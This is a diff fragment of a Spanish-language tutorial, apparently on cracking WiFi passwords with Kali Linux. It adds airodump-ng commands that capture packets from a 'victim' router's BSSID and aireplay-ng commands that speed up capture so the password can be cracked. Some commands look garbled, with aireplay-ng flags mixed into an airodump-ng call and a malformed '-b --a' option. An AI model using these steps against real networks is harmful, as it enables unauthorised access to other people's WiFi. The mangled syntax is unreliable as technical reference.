@@ -31,10 +31,22 @@ Nos mostrará el BSSID(mac) de los routers o PA, intensidad de señal, modo de c
 
 ![refresca la página para cargar el imágen](imagen/kali4.png)
 
+Usamos el comando ```airodump-ng``` para coger los paquetes del red "víctima".
+>airodump-ng -c 6 --bssid E8:DE:27:2F:84:CA -w ./ wlan0mon
+
+```-c```El canal del wifi.
+
+```--bssid```La mac del router.
+
+```-w```El lugar donde vamos a guardar los paquetes capturado.
+Una vez teniendo suficiente paquetes podemos empezar a "hackear" la contraseña.
+
+Con el comando ```aireplay-ng``` aceleramos el paso de capturar paquetes.
 ![refresca la página para cargar el imágen](imagen/kali5.png)
 
+>aireplay-ng -3 -b --a E8:DE:27:2F:84:CA wlan0mon 
 ![refresca la página para cargar el imágen](imagen/kali6.png)
 
-
+>airodump-ng -1 0 -a --bssid E8:DE:27:2F:84:CA wlan0mon
 
 ``````
